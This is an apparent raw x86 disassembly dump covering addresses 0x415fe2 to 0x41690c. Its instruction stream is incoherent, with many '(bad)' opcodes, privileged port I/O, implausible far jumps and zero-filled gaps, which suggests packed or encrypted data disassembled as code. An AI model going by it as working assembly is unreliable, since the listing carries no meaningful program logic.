  415fe2:	adc    edx,DWORD PTR [ecx+0x11]
  415fe5:	jb     0x415fb6
  415fe7:	cmp    cl,0x6f
  415fea:	iret   
  415feb:	cmp    ch,0x5f
  415fee:	mov    DWORD PTR [eax-0x5b7da40b],0x5803e7a9
  415ff8:	mov    esp,esp
  415ffa:	call   DWORD PTR [ecx+eiz*1-0x7527f3a2]
  416001:	fdiv   st(7),st
  416003:	test   BYTE PTR [ecx],ah
  416005:	add    DWORD PTR [esi+esi*8],ebp
  416008:	or     BYTE PTR [edx],dl
  41600a:	sub    al,0x89
  41600c:	adc    BYTE PTR [edx],al
  41600e:	sub    al,0xe3
  416010:	dec    ecx
  416011:	call   0x9246c3b1
  416016:	push   es
  416017:	nop
  416018:	and    BYTE PTR [ecx-0x6],dh
  41601b:	jmp    0xe6beb001
  416020:	in     eax,0xe4
  416022:	add    esp,DWORD PTR [ebx+0x4]
  416025:	scas   al,BYTE PTR es:[edi]
  416026:	test   eax,ecx
  416028:	jmp    0xf3f06309
  41602d:	imul   ebp,DWORD PTR [ecx],0x0
	...
  41603c:	add    BYTE PTR [eax],al
  41603e:	pop    ebp
  41603f:	mov    ch,BYTE PTR [esi]
  416041:	sub    ah,BYTE PTR ds:0xebfc5121
  416047:	rol    DWORD PTR [esp+ecx*1],1
  41604a:	jmp    0x4c9:0xd8140cc1
  416051:	loopne 0x41602c
  416053:	mov    ecx,0xd1e8140c
  416058:	add    al,0xc
  41605a:	xchg   esp,eax
  41605b:	mov    edi,0xd06993ff
  416060:	add    esp,DWORD PTR [eax-0x19]
  416063:	mov    ebx,0x43772d82
  416068:	psubsw mm3,mm7
  41606b:	sub    al,0x37
  41606d:	push   0xfffffffb
  41606f:	in     al,0x43
  416071:	jmp    0x7d31ec28
  416076:	mov    ecx,0xdf9fbfd3
  41607b:	inc    esp
  41607c:	aaa    
  41607d:	sub    ebx,DWORD PTR [edi+0x5]
  416080:	mov    esp,DWORD PTR [ebp-0x567b1f7c]
  416086:	int    0xe
  416088:	xor    DWORD PTR [ecx-0x527d3db5],0x78
  41608f:	inc    esi
  416090:	pop    ss
  416091:	jmp    0x2d652c9d
  416096:	cld    
  416097:	dec    esp
  416098:	jae    0x416069
  41609a:	div    DWORD PTR [ebx+0x35ec2523]
  4160a0:	jae    0x416069
	...
  4160ae:	add    BYTE PTR [eax],al
  4160b0:	add    cl,ch
  4160b2:	mov    DWORD PTR [ebx],edx
  4160b4:	in     eax,dx
  4160b5:	pusha  
  4160b6:	add    eax,0xffe27048
  4160bb:	add    ebp,ecx
  4160bd:	pusha  
  4160be:	mov    cs,WORD PTR [ebp-0x1dfbb07]
  4160c4:	inc    ecx
  4160c5:	pop    edx
  4160c6:	sbb    ebp,ebp
  4160c8:	push   edx
  4160c9:	das    
  4160ca:	dec    ebp
  4160cb:	push   esi
  4160cc:	out    0xb2,al
  4160ce:	pop    ebp
  4160cf:	(bad)  
  4160d0:	fsub   DWORD PTR [ecx]
  4160d2:	and    bh,cl
  4160d4:	sub    DWORD PTR [edi],edx
  4160d6:	inc    edi
  4160d7:	push   cs
  4160d8:	xchg   edi,eax
  4160d9:	mov    DWORD PTR ds:0x3660a810,eax
  4160df:	mov    edi,0xb60fa21a
  4160e4:	add    bl,ah
  4160e6:	or     DWORD PTR [eax],edx
  4160e8:	inc    ecx
  4160e9:	or     dh,BYTE PTR [ebx+0x1d3d33be]
  4160ef:	mov    ah,0xb9
  4160f1:	stc    
  4160f2:	repz inc eax
  4160f4:	add    BYTE PTR [ebx-0x413e7e3c],bl
  4160fa:	sbb    ch,al
  4160fc:	xor    DWORD PTR [ebx+0x4],0x59ba0001
  416103:	mov    DWORD PTR [ebp-0x447ce276],0x530003b3
  41610d:	inc    ebx
  41610e:	test   BYTE PTR [esi+ecx*2+0x18c082be],0x0
	...
  416122:	add    BYTE PTR [eax],al
  416124:	jmp    0x8:0x8abf0005
  41612b:	add    BYTE PTR [edi],al
  41612d:	push   ecx
  41612e:	call   DWORD PTR [ebx+eax*1-0x6]
  416132:	xor    al,al
  416134:	pop    DWORD PTR [ebx]
  416136:	add    BYTE PTR [eax],al
  416138:	mov    bl,BYTE PTR [edx+0x63ec727]
  41613e:	add    BYTE PTR [eax],al
  416140:	jp     0x416145
  416142:	add    BYTE PTR [ebx+0x3d060a],al
  416148:	add    eax,DWORD PTR ds:[eax]
  41614b:	jb     0x416133
  41614d:	mov    al,al
  41614f:	add    BYTE PTR [esi],bh
  416151:	add    eax,DWORD PTR [eax]
  416153:	or     DWORD PTR [ebx],0x6
  416156:	sub    edi,ebx
  416158:	das    
  416159:	ror    DWORD PTR [ecx-0x1e0f172],1
  41615f:	inc    ecx
  416161:	jae    0x84e1e72f
  416167:	and    al,0xfe
  416169:	add    al,BYTE PTR [eax]
  41616b:	mov    DWORD PTR [ebx-0x5a],esp
  41616e:	sti    
  41616f:	add    esp,DWORD PTR [ebx+0x2c]
  416172:	jnp    0x416111
  416174:	xor    BYTE PTR [bp+si],al
  416177:	add    dl,ch
  416179:	sahf   
  41617a:	test   DWORD PTR [ebx],0x397b2c63
  416180:	fdivr  DWORD PTR [esi+0x2c63040f]
  416186:	jns    0x41611d
	...
  416194:	add    BYTE PTR [eax],al
  416196:	add    BYTE PTR [ebx+0x28],dh
  416199:	add    al,BYTE PTR [eax]
  41619b:	fidiv  DWORD PTR [esi+0x2c6303db]
  4161a1:	js     0x4161ab
  4161a3:	jmp    0xde68:0xe81bde70
  4161aa:	push   ebx
  4161ab:	(bad)  [edx]
  4161ad:	add    ebx,DWORD PTR [esi+0x2284f]
  4161b3:	bound  eax,QWORD PTR [esi+0x2c630412]
  4161b9:	mov    edx,0x14100f88
  4161be:	mov    DWORD PTR [edi],eax
  4161c0:	or     BYTE PTR [ecx+ecx*4],cl
  4161c3:	(bad)  [eax]
  4161c5:	(bad)  
  4161c6:	push   DWORD PTR [ebp+edx*4-0x3a]
  4161ca:	and    ecx,DWORD PTR [ebx]
  4161cc:	adc    eax,DWORD PTR [ecx+0xe]
  4161cf:	fstp   QWORD PTR [ebx-0x3]
  4161d2:	call   FWORD PTR [ecx+ebx*4-0x77]
  4161d6:	call   DWORD PTR [esp+ebp*1+0x2]
  4161da:	mov    esp,DWORD PTR [edi+0x2384c650]
  4161e0:	clc    
  4161e1:	jmp    0xa921170
  4161e6:	inc    ecx
  4161e7:	jmp    0xaf64:0xe717dfef
  4161ee:	sub    al,0xd8
  4161f0:	neg    edi
  4161f2:	pop    edi
  4161f3:	call   0x5f54d8fc
  4161f8:	add    eax,0xdae9
	...
  416209:	add    BYTE PTR [eax-0x262e4717],bl
  41620f:	jbe    0x416205
  416211:	(bad)  
  416212:	cld    
  416213:	sbb    eax,0xb540d011
  416218:	xchg   edi,eax
  416219:	jp     0x4161b3
  41621b:	jmp    0x1ed533b4
  416220:	sbb    BYTE PTR [edx+0x436bf4a0],al
  416226:	mov    DWORD PTR gs:[ebx-0x2ee23302],edx
  41622d:	mov    DWORD PTR [eax-0x17ee6bff],0xe9bfccb0
  416237:	mov    eax,0xb0dbc3c4
  41623c:	int3   
  41623d:	xlat   BYTE PTR ds:[ebx]
  41623e:	fstp   TBYTE PTR [eax-0x276243c]
  416244:	jno    0x416206
  416246:	inc    eax
  416247:	mov    ecx,0x9707671
  41624c:	jmp    0x38839a54
  416251:	rcl    DWORD PTR [ebx],1
  416253:	nop
  416254:	sbb    al,0xe0
  416256:	xor    BYTE PTR [ebx-0x7e7bc98f],dh
  41625c:	mov    cl,0x25
  41625e:	mov    DWORD PTR gs:[eax+eiz*8],edi
  416262:	mov    BYTE PTR [eax-0x769bfd5d],cl
  416268:	inc    esi
  416269:	dec    DWORD PTR [ebp+ebx*1+0x61]
  41626d:	jle    0x41626f
	...
  41627b:	add    BYTE PTR [eax],al
  41627d:	add    BYTE PTR [ecx],0xe9
  416280:	add    esp,DWORD PTR [edx+eax*8]
  416283:	int3   
  416284:	packsswb mm0,QWORD PTR ds:0xc16a03e9
  41628b:	dec    esp
  41628d:	or     BYTE PTR [edx+0x5466a61],dl
  416293:	movq   mm6,QWORD PTR [ecx]
  416296:	or     BYTE PTR [eax],al
  416298:	jmp    0x11652b96
  41629d:	push   cs
  41629e:	mov    DWORD PTR [edi-0x16],eax
  4162a1:	pusha  
  4162a2:	add    eax,0xd14ad8b
  4162a7:	push   edi
  4162a8:	adc    ah,BYTE PTR [esi+0x2d624fb7]
  4162ae:	and    al,0xe1
  4162b0:	xor    eax,0xb58a1b86
  4162b5:	mov    ah,0xd4
  4162b7:	push   esi
  4162b8:	mov    eax,0x318a4a4b
  4162bd:	addr16 pop eax
  4162bf:	test   BYTE PTR [esi],0x86
  4162c2:	ffreep st(2)
  4162c4:	imul   BYTE PTR ds:0x60e902f9
  4162ca:	nop
  4162cb:	inc    ebx
  4162cc:	int    0xb8
  4162ce:	fcos   
  4162d0:	jecxz  0x416332
  4162d2:	add    eax,0x1be3f07c
  4162d7:	add    esi,ebp
  4162d9:	or     al,0xd
  4162db:	add    ebp,ecx
  4162dd:	pusha  
  4162de:	(bad)  
  4162e0:	dec    ebx
	...
  4162ed:	add    BYTE PTR [eax],al
  4162ef:	add    BYTE PTR [edi+0x5],ah
  4162f2:	jl     0x4162e4
  4162f4:	jecxz  0x416311
  4162f6:	add    ch,dh
  4162f8:	in     al,dx
  4162f9:	sbb    al,0x1
  4162fb:	jmp    0x59cf360
  416300:	das    
  416301:	pop    DWORD PTR [ebx-0x33]
  416304:	and    al,0x8f
  416306:	xchg   ebp,eax
  416307:	cmc    
  416308:	dec    esp
  416309:	sbb    al,0xfe
  41630b:	ret    0x8da3
  41630e:	inc    ebx
  41630f:	lds    eax,FWORD PTR [eax-0x3c]
  416312:	dec    edi
  416313:	add    BYTE PTR [edi+0x7850ff5d],ch
  416319:	aaa    
  41631a:	mov    eax,DWORD PTR [esi+edx*1+0x54]
  41631e:	dec    esi
  41631f:	mov    edi,esp
  416321:	(bad)  
  416322:	(bad)  
  416324:	jge    0x416307
  416326:	mov    DWORD PTR [esi+eiz*2+0x39],ecx
  41632a:	aaa    
  41632b:	dec    esp
  41632c:	push   esi
  41632d:	inc    ecx
  41632e:	mov    eax,DWORD PTR [ebx+0xb]
  416331:	lahf   
  416332:	inc    edx
  416333:	and    al,0xfe
  416335:	dec    edx
  416336:	jp     0x416371
  416338:	jno    0x4162f1
  41633a:	push   eax
  41633b:	mov    edi,DWORD PTR [eax+eax*1]
  41633e:	inc    ebx
  41633f:	test   DWORD PTR [ebp-0x59b3761f],0xa6448747
  416349:	cmp    ecx,DWORD PTR [ecx+0x4e5b9644]
  41634f:	push   ecx
  416350:	inc    ecx
  416351:	shl    dh,cl
  416353:	das    
	...
  416360:	add    BYTE PTR [eax],al
  416362:	add    BYTE PTR [ebp-0x1740219],dh
  416368:	cmp    esp,DWORD PTR [edx]
  41636a:	sub    eax,DWORD PTR [edx-0x2c4736fb]
  416370:	xchg   ecx,eax
  416371:	loope  0x4163ab
  416373:	mov    ch,0xe9
  416375:	iret   
  416376:	cli    
  416377:	adc    ebx,eax
  416379:	mov    edi,0xc2028de8
  41637e:	jmp    0x4163da
  416380:	mov    WORD PTR [edx+0x24],cs
  416383:	dec    esi
  416384:	push   edx
  416385:	mov    esi,ecx
  416387:	xchg   edx,eax
  416388:	or     edi,esi
  41638a:	jmp    FWORD PTR [ebp-0x79dbad75]
  416390:	mov    dl,dh
  416392:	mov    eax,DWORD PTR [esi-0x75adc1d3]
  416398:	mov    cl,ah
  41639a:	call   0xfe5ade02
  41639f:	cmp    al,0x48
  4163a1:	cmp    cl,BYTE PTR [edx+0x23bf9820]
  4163a7:	mov    esp,DWORD PTR [ebp+0x2f60e186]
  4163ad:	inc    esp
  4163ae:	rcr    BYTE PTR [ebx],0x2f
  4163b1:	add    eax,0xdd683f44
  4163b6:	out    0x8e,eax
  4163b8:	adc    al,0x49
  4163ba:	inc    ebx
  4163bb:	aas    
  4163bc:	sbb    BYTE PTR [ebx],al
  4163be:	add    BYTE PTR [ebx+0x2c],ah
  4163c1:	xchg   esi,edi
  4163c3:	ins    DWORD PTR es:[edi],dx
  4163c4:	add    al,0xdd
  4163c6:	imul   eax,DWORD PTR [eax],0x0
	...
  4163d5:	add    BYTE PTR [edi+0x60],al
  4163d8:	sahf   
  4163d9:	das    
  4163da:	fsub   DWORD PTR [eax-0x1a]
  4163dd:	daa    
  4163de:	ss jge 0x41636e
  4163e1:	int    0xcb
  4163e3:	mov    ds:0x97ccfe19,al
  4163e8:	mov    bh,0x23
  4163ea:	pop    ds
  4163eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163ec:	cmp    ecx,DWORD PTR [edx+0x51c24027]
  4163f2:	adc    edx,DWORD PTR [edi+0x12f8e751]
  4163f8:	and    esi,edi
  4163fa:	push   0x475b8eef
  4163ff:	je     0x4163a0
  416401:	pop    es
  416402:	pushf  
  416403:	call   0x2ca377ef
  416408:	add    al,BYTE PTR [eax]
  41640a:	fidiv  WORD PTR [ebx]
  41640c:	xchg   edi,eax
  41640d:	dec    esp
  41640e:	cmp    bl,al
  416410:	out    0x43,eax
  416412:	imul   dl
  416414:	mov    cs,WORD PTR [ebp+0x22057]
  41641a:	stc    
  41641b:	sub    al,0xb5
  41641d:	push   eax
  41641e:	call   0x50df8e9c
  416423:	add    eax,0xb0d922a6
  416428:	(bad)  
  416429:	(bad)  
  41642a:	fnstcw WORD PTR [ecx+eiz*2]
  41642d:	mov    DWORD PTR [eax-0x164bc53b],0x36b0904a
  416437:	sbb    bh,BYTE PTR [ebp-0x72]
	...
  416446:	add    BYTE PTR [eax],al
  416448:	add    BYTE PTR [eax-0x4c473f1f],bl
  41644e:	mov    ds,WORD PTR [esi-0x18024770]
  416454:	sub    ebp,DWORD PTR [eax+0x49225d13]
  41645a:	cmp    eax,0xbd40bf61
  41645f:	into   
  416460:	or     eax,0xf80cc11c
  416465:	in     al,dx
  416466:	sbb    eax,ebp
  416468:	add    edi,eax
  41646a:	or     eax,0xf1809f6a
  41646f:	call   0xe98c4286
  416474:	add    esp,DWORD PTR [ebx-0x7a]
  416477:	sbb    eax,DWORD PTR ds:0x4418b54
  41647d:	arpl   WORD PTR ds:0xe580b762,ax
  416483:	jno    0x41640e
  416485:	push   eax
  416486:	add    ecx,ebp
  416488:	add    esp,eax
  41648a:	inc    esi
  41648b:	div    BYTE PTR [ecx+eiz*8-0x1e4915bb]
  416492:	inc    esp
  416493:	jmp    0x33e0:0x4c8dfb3
  41649a:	mov    fs,WORD PTR [esi-0x32e413d4]
  4164a0:	and    ecx,ebp
  4164a2:	ror    BYTE PTR [esp+edx*8],0x29
  4164a6:	rol    DWORD PTR [esp+ebp*8],0xd9
  4164aa:	mov    al,0xff
  4164ac:	or     al,0x0
	...
  4164ba:	add    BYTE PTR [eax],al
  4164bc:	cmp    esi,DWORD PTR [edi-0x62f06076]
  4164c2:	and    dl,BYTE PTR [ecx-0x6101ee94]
  4164c8:	(bad)  
  4164c9:	xor    BYTE PTR [edx+0x54e14b2d],cl
  4164cf:	cmp    esi,esp
  4164d1:	dec    edx
  4164d2:	out    0x97,eax
  4164d4:	push   esp
  4164d5:	pop    ss
  4164d6:	(bad)  
  4164d7:	rcr    BYTE PTR [edi+0x668b827d],cl
  4164dd:	add    al,0xc2
  4164df:	bound  esp,QWORD PTR [edi+0x3febf845]
  4164e5:	out    dx,al
  4164e6:	out    0x43,eax
  4164e8:	ins    BYTE PTR es:[edi],dx
  4164e9:	pop    ss
  4164ea:	(bad)  
  4164eb:	bound  edi,QWORD PTR [edi]
  4164ed:	mov    eax,DWORD PTR [ebx+0x5]
  4164f0:	pop    es
  4164f1:	mov    dl,0x4f
  4164f3:	jb     0x416486
  4164f5:	and    dl,cl
  4164f7:	xor    al,0x42
  4164f9:	pop    ss
  4164fa:	mov    ah,BYTE PTR [ecx]
  4164fc:	into   
  4164fd:	dec    ebx
  4164fe:	add    ah,BYTE PTR [eax]
  416500:	aaa    
  416501:	sub    eax,0xfd172a1
  416506:	call   0xc9ccca43
  41650b:	sub    BYTE PTR [eax-0x19dcfd09],cl
  416511:	les    esp,FWORD PTR [ebx]
  416513:	mov    ebp,0x103a4d67
  416518:	les    eax,FWORD PTR [eax]
  41651a:	(bad)  
  41651b:	lods   eax,DWORD PTR ds:[esi]
  41651c:	test   ah,dh
  41651e:	add    cl,ch
	...
  41652c:	add    BYTE PTR [eax],al
  41652e:	add    BYTE PTR [eax+0x5],ah
  416531:	test   esi,esp
  416533:	jmp    0x8ae4:0xe4a43ae0
  41653a:	cmp    eax,0x3b4fe88b
  41653f:	out    0x4a,al
  416541:	out    0x0,eax
  416543:	hlt    
  416544:	out    dx,al
  416545:	std    
  416546:	push   ecx
  416548:	fisttp DWORD PTR [ecx+0x53296e44]
  41654e:	push   eax
  41654f:	shl    DWORD PTR [esi-0x1b10801a],0xfd
  416556:	cmp    esp,DWORD PTR [edx]
  416558:	cmc    
  416559:	mov    eax,DWORD PTR [edx]
  41655b:	dec    ecx
  41655c:	add    al,0x0
  41655e:	and    DWORD PTR [esi+0x2d],0x12
  416562:	add    BYTE PTR ds:0x3a02f57f,dh
  416568:	add    al,0x83
  41656a:	std    
  41656b:	or     ebp,esi
  41656d:	(bad)  
  41656e:	aam    0xa
  416570:	add    al,0x0
  416572:	mov    edx,esi
  416574:	pop    ds
  416575:	push   ds
  416576:	mov    ecx,esi
  416578:	pop    ds
  416579:	push   esi
  41657a:	mov    ecx,DWORD PTR [eax+edx*1-0x7ef5fffe]
  416581:	mov    edi,0xc080cbfd
  416586:	add    ecx,eax
  416588:	cmp    BYTE PTR [esi+0x4a86fa03],0x24
  41658f:	(bad)  
  416590:	push   edx
  416591:	mov    esi,ecx
	...
  41659f:	add    BYTE PTR [eax],al
  4165a1:	add    BYTE PTR [edx-0x45],dh
  4165a4:	idiv   bh
  4165a6:	mov    DWORD PTR gs:[edx+0x24],eax
  4165aa:	call   0x5a88:0x8e245288
  4165b1:	and    al,0x92
  4165b3:	cmp    cl,al
  4165b5:	push   edx
  4165b6:	xor    DWORD PTR [esi-0x145083b2],esi
  4165bc:	and    dh,ch
  4165be:	test   edi,esi
  4165c0:	push   ebx
  4165c1:	push   ebx
  4165c2:	adc    edi,eax
  4165c4:	xchg   DWORD PTR [esi+ebx*2+0x15],eax
  4165c8:	out    0x17,al
  4165ca:	arpl   WORD PTR [ecx],di
  4165cc:	push   ds
  4165cd:	(bad)  
  4165ce:	call   0x38654dcc
  4165d3:	ins    DWORD PTR es:[edi],dx
  4165d4:	jl     0x416558
  4165d6:	sub    DWORD PTR [edx],0x64e8c201
  4165dc:	inc    esp
  4165dd:	clc    
  4165de:	popa   
  4165df:	inc    ebx
  4165e0:	out    dx,eax
  4165e1:	out    0x4c,eax
  4165e3:	jns    0x416603
  4165e5:	(bad)  
  4165e6:	scas   al,BYTE PTR es:[edi]
  4165e7:	fisttp DWORD PTR [edx-0x18171533]
  4165ed:	sub    ecx,DWORD PTR [ebx+0x7b]
  4165f0:	pop    ss
  4165f1:	(bad)  
  4165f2:	sub    al,0x94
  4165f4:	dec    ebx
  4165f5:	mov    bl,BYTE PTR [edi+0x2b2ae640]
  4165fb:	sub    al,0x4b
  4165fd:	mov    bh,0xa
  4165ff:	retf   
  416600:	mov    ch,BYTE PTR ds:0xf934b614
	...
  416612:	add    BYTE PTR [eax],al
  416614:	add    al,bl
  416616:	rol    BYTE PTR [eax+ebp*8+0x5c],cl
  41661a:	sub    ecx,DWORD PTR [eax-0x76]
  41661d:	lahf   
  41661e:	add    al,bl
  416620:	add    bl,BYTE PTR [ebx]
  416622:	add    al,0x2d
  416624:	jl     0x416681
  416626:	ffreep st(7)
  416628:	and    esi,DWORD PTR [edi+0x2d]
  41662b:	add    al,BYTE PTR [eax]
  41662d:	arpl   WORD PTR [ecx+0x237b751e],sp
  416633:	inc    edi
  416634:	jnp    0x4166b5
  416636:	xchg   ebx,eax
  416637:	mov    bh,0x23
  416639:	jae    0x416697
  41663b:	mov    al,0x8a
  41663d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41663e:	add    al,0x55
  416640:	rep lods al,BYTE PTR ds:[esi]
  416642:	dec    DWORD PTR [edx-0x199f2729]
  416648:	daa    
  416649:	ss jl  0x4165d5
  41664c:	int    0x8b
  41664e:	retf   0xfe17
  416651:	mov    WORD PTR ds:0x89553c22,es
  416657:	add    eax,DWORD PTR [edx]
  416659:	arpl   WORD PTR ds:0xf1409f6a,ax
  41665f:	call   0xeb3d4c72
  416664:	add    esp,DWORD PTR [ebx-0x76]
  416667:	sbb    al,0xe8
  416669:	mov    ah,0x80
  41666b:	mov    ch,0xe
  41666d:	fild   QWORD PTR [ecx-0x7d9cfc19]
  416673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416674:	add    al,0x54
  416676:	jg     0x4166b0
  416678:	add    eax,0x0
	...
  416685:	add    BYTE PTR [eax],al
  416687:	add    BYTE PTR [ebx+0x5],ah
  41668a:	bound  esi,QWORD PTR [edi+0x4e61b180]
  416690:	jns    0x4166dc
  416692:	jae    0x41669b
  416694:	pop    ecx
  416695:	fisub  DWORD PTR [ebp-0x52759d6b]
  41669b:	mov    bl,0xe9
  41669d:	rol    ah,0xf7
  4166a0:	cmp    DWORD PTR [esi],esi
  4166a2:	mov    ecx,0x4c8d7b3
  4166a7:	loopne 0x41663c
  4166a9:	mov    ah,BYTE PTR [esi]
  4166ab:	mov    WORD PTR [eax+0x182c04e1],ds
  4166b1:	push   cs
  4166b2:	inc    ebp
  4166b3:	push   ds
  4166b4:	sub    ebx,DWORD PTR [ecx-0x2ead27fc]
  4166ba:	popa   
  4166bb:	mov    bh,0x80
  4166bd:	aad    0x95
  4166bf:	mov    cl,0xd9
  4166c1:	inc    esi
  4166c2:	adc    al,ah
  4166c4:	rcl    BYTE PTR ds:0x89948a1d,1
  4166ca:	lods   al,BYTE PTR ds:[esi]
  4166cb:	out    0x6c,eax
  4166cd:	scas   al,BYTE PTR es:[edi]
  4166ce:	mov    eax,0xd62c9e8a
  4166d3:	pop    ss
  4166d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166d5:	adc    eax,0xb8e942c1
  4166da:	dec    esp
  4166dc:	mov    WORD PTR [edi-0x1e639df1],ss
  4166e2:	das    
  4166e3:	jb     0x4166b0
  4166e5:	loope  0x41671a
  4166e7:	jo     0x41667c
  4166e9:	loope  0x416722
  4166eb:	pusha  
	...
  4166f8:	add    BYTE PTR [eax],al
  4166fa:	add    BYTE PTR [ebx-0x649dc41f],bh
  416700:	loope  0x416711
  416702:	push   ds
  416703:	mov    dl,0xc5
  416705:	mov    ch,BYTE PTR [edi-0x490f1471]
  41670b:	jbe    0x41678c
  41670d:	dec    ebx
  41670e:	add    eax,0x7250bc2f
  416713:	xchg   ebp,eax
  416714:	jg     0x4166ed
  416716:	xchg   ecx,eax
  416717:	pop    eax
  416718:	pop    ss
  416719:	(bad)  
  41671a:	xchg   esi,eax
  41671b:	sbb    cl,BYTE PTR [eax+0xe]
  41671e:	pop    esp
  41671f:	(bad)  
  416720:	adc    al,0xfe
  416722:	jmp    0xd1651802
  416727:	cmp    esi,DWORD PTR [ebx+0x23]
  41672a:	in     eax,dx
  41672b:	pusha  
  41672c:	add    eax,0xb8da1175
  416731:	and    edi,ebp
  416733:	fcmovne st,st(0)
  416735:	and    edi,ecx
  416737:	mov    bh,0xb6
  416739:	dec    edi
  41673a:	bound  esp,QWORD PTR [ebp+0x4e59f12c]
  416740:	adc    edx,DWORD PTR [edx+ebx*4-0x25]
  416744:	inc    edx
  416745:	mov    BYTE PTR [ebp+0x2fe7e0c4],ah
  41674b:	jb     0x416760
  41674d:	(bad)  
  41674e:	bound  esi,QWORD PTR [ebx+0x18ea23e8]
  416754:	jg     0x416728
  416756:	mov    ah,0xa2
  416758:	jge    0x4167a5
  41675a:	int    0xc8
  41675c:	mov    dh,0x8a
  41675e:	pop    ds
	...
  41676b:	add    BYTE PTR [eax],al
  41676d:	add    BYTE PTR [edi+0x64],bh
  416770:	repnz add BYTE PTR [ebp-0xe],bl
  416774:	mov    eax,ebx
  416776:	adc    DWORD PTR ds:0x58f53822,edi
  41677c:	mov    esi,ecx
  41677e:	bound  ebp,QWORD PTR [eax+0x7d7dfff1]
  416784:	push   0x24
  416786:	outs   dx,BYTE PTR ds:[esi]
  416787:	push   es
  416788:	fmul   DWORD PTR [ebx+0x3b221d46]
  41678e:	mov    ecx,0x42245a7d
  416793:	jae    0x4167dc
  416795:	jmp    0x4167dd
  416797:	jge    0x4167f3
  416799:	and    al,0x72
  41679b:	jle    0x4167df
  41679d:	and    al,0x52
  41679f:	sub    eax,0x8362484
  4167a4:	add    BYTE PTR [ebp+0x33],dh
  4167a7:	test   DWORD PTR [eax+ebp*1+0x846],edi
  4167ae:	push   esi
  4167af:	push   cs
  4167b0:	cmp    eax,DWORD PTR [eax]
  4167b2:	aaa    
  4167b3:	or     BYTE PTR [eax],al
  4167b5:	jl     0x4167be
  4167b7:	test   ebp,edi
  4167b9:	add    dl,BYTE PTR [esi]
  4167bb:	es jg  0x41683a
  4167be:	es xor dh,bh
  4167c1:	jl     0x4167bd
  4167c3:	pop    es
  4167c4:	jl     0x4167cb
  4167c6:	mov    ecx,esi
  4167c8:	add    DWORD PTR [ecx+edi*8+0x7c],esi
  4167cc:	dec    edx
  4167cd:	and    al,0x52
  4167cf:	pop    edx
  4167d0:	dec    edi
  4167d1:	mov    eax,DWORD PTR [eax]
	...
  4167df:	add    BYTE PTR [eax],al
  4167e1:	sub    al,0xe0
  4167e3:	int3   
  4167e4:	repz popf 
  4167e6:	icebp  
  4167e7:	jmp    0x2295a91c
  4167ec:	pop    eax
  4167ed:	inc    ecx
  4167ee:	dec    esp
  4167ef:	and    dl,BYTE PTR [eax]
  4167f1:	push   ecx
  4167f2:	aad    0x29
  4167f4:	xlat   BYTE PTR ds:[ebx]
  4167f5:	clc    
  4167f6:	push   edi
  4167f7:	mov    esi,ecx
  4167f9:	arpl   WORD PTR [esi],ax
  4167fb:	outs   dx,BYTE PTR ds:[esi]
  4167fc:	out    dx,eax
  4167fd:	lods   al,BYTE PTR ds:[esi]
  4167fe:	add    bl,BYTE PTR [ebx+eax*2]
  416801:	jg     0x416831
  416803:	jg     0x4167f3
  416805:	bound  ebx,QWORD PTR [ecx-0x588e15dc]
  41680b:	mov    dh,0x23
  41680d:	jae    0x4167c0
  41680f:	(bad)  
  416810:	(bad)  
  416811:	xor    dl,al
  416813:	mov    cs,ebp
  416815:	mov    ecx,DWORD PTR [edi-0x118b01ed]
  41681b:	sbb    al,BYTE PTR [edx-0x70f6e192]
  416821:	loop   0x416840
  416823:	add    al,BYTE PTR [eax]
  416825:	call   0x634557d4
  41682a:	sbb    al,0xaf
  41682c:	push   edx
  41682d:	mov    bl,0xa7
  41682f:	dec    ecx
  416830:	out    0x65,eax
  416832:	ins    BYTE PTR es:[edi],dx
  416833:	sbb    bh,dh
  416835:	call   0x8e69481a
  41683a:	int    0x8e
  41683c:	int    0xd8
  41683e:	push   esp
  41683f:	sub    ebp,edi
  416841:	xor    DWORD PTR [edx+ebx*1+0x3a],ecx
	...
  416854:	and    BYTE PTR [edx+ebp*8],dl
  416857:	mov    bl,BYTE PTR [edi-0x1ac515c0]
  41685d:	dec    eax
  41685e:	(bad)  
  41685f:	inc    DWORD PTR [edx+esi*1]
  416862:	or     eax,DWORD PTR [ebx-0xb43]
  416868:	arpl   WORD PTR [esi+ecx*4],bx
  41686b:	inc    esp
  41686c:	cs sbb al,0xff
  41686f:	jmp    DWORD PTR [ebx+0x48]
  416872:	inc    DWORD PTR [edx+0x68e1ede]
  416878:	xchg   esi,eax
  416879:	sbb    al,0x97
  41687b:	dec    esp
  41687d:	pusha  
  41687e:	aam    0x8a
  416880:	daa    
  416881:	add    eax,0xa1ebbbcd
  416886:	(bad)  
  416887:	out    dx,eax
  416888:	fbld   TBYTE PTR [eax]
  41688a:	pushf  
  41688b:	jecxz  0x416866
  41688d:	jnp    0x416883
  41688f:	jmp    DWORD PTR [edx+edx*1+0x43e9b599]
  416896:	adc    ch,ah
  416898:	test   BYTE PTR [edx],dl
  41689a:	cmc    
  41689b:	pop    ebx
  41689c:	arpl   WORD PTR ds:0x8b6203e9,ax
  4168a2:	cld    
  4168a3:	(bad)  
  4168a4:	jl     0x4168b8
  4168a6:	xadd   BYTE PTR [eax-0x7],al
  4168aa:	pop    ebx
  4168ab:	and    al,0xdf
  4168ad:	mov    cl,0xeb
  4168af:	sbb    bh,BYTE PTR [ecx-0x51]
  4168b2:	jno    0x41686b
  4168b4:	sub    BYTE PTR [ebp+0xbf71],0x0
	...
  4168c7:	sbb    ch,0x1b
  4168ca:	mov    ah,0xd9
  4168cc:	inc    edx
  4168cd:	rol    BYTE PTR [esi],0x50
  4168d0:	adc    ah,BYTE PTR [ebp-0x1b06f2fc]
  4168d6:	add    esp,DWORD PTR [ebx-0x80]
  4168d9:	xor    al,0xf9
  4168db:	sub    eax,0x888ecb1e
  4168e0:	jmp    0x985eea05
  4168e5:	(bad)  
  4168e6:	mov    gs,WORD PTR [eax-0x9713f17]
  4168ec:	clc    
  4168ed:	in     al,0x3
  4168ef:	arpl   WORD PTR [esp+edx*8-0x21],di
  4168f3:	cmp    BYTE PTR [esp+ebp*4-0x21],bh
  4168f7:	sub    al,0x7c
  4168f9:	mov    esp,0x41ca5cdf
  4168fe:	icebp  
  4168ff:	fist   WORD PTR [ecx]
  416901:	mov    esp,0xed1e2406
  416906:	mov    ds,esi
  416908:	clc    
  416909:	(bad)  
  41690a:	in     al,dx
  41690b:	pusha  
  41690c:	add    eax,0x3fd59953
